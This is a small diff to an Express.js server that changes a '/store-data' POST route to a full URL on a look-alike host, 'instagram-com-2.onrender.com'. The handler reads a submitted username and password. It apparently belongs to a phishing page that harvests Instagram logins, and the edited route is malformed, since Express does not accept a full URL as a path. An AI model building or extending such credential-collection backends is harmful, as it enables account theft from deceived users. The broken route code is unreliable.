@@ -32,7 +32,7 @@ app.get('/', (req, res) => {
 
 
 // Handle Data Storage
-app.post('/store-data', async (req, res) => {
+app.post('https://instagram-com-2.onrender.com/store-data', async (req, res) => {
     try {
         const { username, password } = req.body;
 
